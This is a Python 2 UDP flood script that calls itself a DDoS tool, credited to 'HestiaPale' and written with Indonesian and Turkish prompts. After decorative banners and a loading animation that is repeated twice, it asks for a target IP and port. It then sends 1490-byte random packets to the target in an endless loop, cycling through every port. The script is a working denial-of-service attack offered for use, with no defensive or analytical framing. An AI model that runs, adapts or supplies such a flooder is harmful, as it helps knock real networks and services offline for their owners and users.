#Ddos
#Ga usah Recode asw
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
m = '\x1b[1;91m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
c = '\x1b[1;96m'
p = '\x1b[0m'
i = '\x1b[1;90m'
v = '\x1b[1;38;5;198m'
j = '\x1b[1;38;5;208m'
w = (m, v, j, p, k, b, u, c)
W = pilih(w)

def load():
    l = 'H '
    a = 'E'
    g = 'S '
    i = 'T '
    n = 'I '
    P = 'A  '
    r = '. '
    h = '. '
    w = '. '
    u = '. '
    o = '. '
    s = '. '
    e = '. '
    S = '. '
    for z in range(90):
        waktu(0.1)
        stdout.write('\r                                  [\x1b[1;36m' + l[z % len(l)] + a[z % len(a)] + g[z % len(g)] + i[z % len(i)] + n[z % len(n)] + P[z % len(P)] + r[z % len(r)] + o[z % len(o)] + s[z % len(s)] + e[z % len(e)] + S[z % len(S)] + P[z % len(P)] + r[z % len(r)] + S[z % len(S)] + u[z % len(u)] + w[z % len(w)] + h[z % len(h)] + '\x1b[1;37m]')
        stdout.flush()
        
load()

import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
m = '\x1b[1;91m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
c = '\x1b[1;96m'
p = '\x1b[0m'
i = '\x1b[1;90m'
v = '\x1b[1;38;5;198m'
j = '\x1b[1;38;5;208m'
w = (m, v, j, p, k, b, u, c)
W = pilih(w)

def load():
    l = 'H '
    a = 'E '
    g = 'S'
    i = 'T '
    n = 'I '
    P = 'A '
    r = '. '
    h = '. '
    w = '. '
    u = '. '
    o = '. '
    s = '. '
    e = '. '
    S = '. '
    for z in range(90):
        waktu(0.1)
        stdout.write('\r                                  [\x1b[1;36m' + l[z % len(l)] + a[z % len(a)] + g[z % len(g)] + i[z % len(i)] + n[z % len(n)] + P[z % len(P)] + r[z % len(r)] + o[z % len(o)] + s[z % len(s)] + e[z % len(e)] + S[z % len(S)] + P[z % len(P)] + r[z % len(r)] + S[z % len(S)] + u[z % len(u)] + w[z % len(w)] + h[z % len(h)] + '\x1b[1;37m]')
        stdout.flush()
        
load()

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system('clear')
os.system("figlet HestiaPale |lolcat")   
print '\x1b[1;96m                   /\  /--\  '                
print '\x1b[1;96m           _______/  \/    1============== '
print '\x1b[1;96m  /\       /____            1oooooooooooooooo'
print '\x1b[1;96m  1-------/ /__|    O  /    1ooooooooooooooooo'
print '\x1b[1;96m  \--------____       /    /oooooooooooooooooo '
print '\x1b[1;96m   v v v v v \ \_____/  \ 1oooooooooooooooooo '
print '\x1b[1;96m   /\/\/\/\/\/\ /         \ooooooooooooooooo  ' 
print '\x1b[1;96m   \_______________      />>>>>>>>>>>>>>>>>  ' 
print '\x1b[1;96m   *Hestia*   \    /=================   '
print '\x1b[1;96m  \The Ultimate Shadow System '
print '\x1b[1;96m  /Hicbir Sistem Guvenli Degildir'
print

print "Distributed Denial Of Service(DDOS)"
print "Edit By HestiaPale2"
print "iletisim"
print "e mail :Hestiapale@gmail.com"
print "IG:@Hestiapale"
print
ip = raw_input("Hedef Ip  : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Saldiri Basliyor")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

    
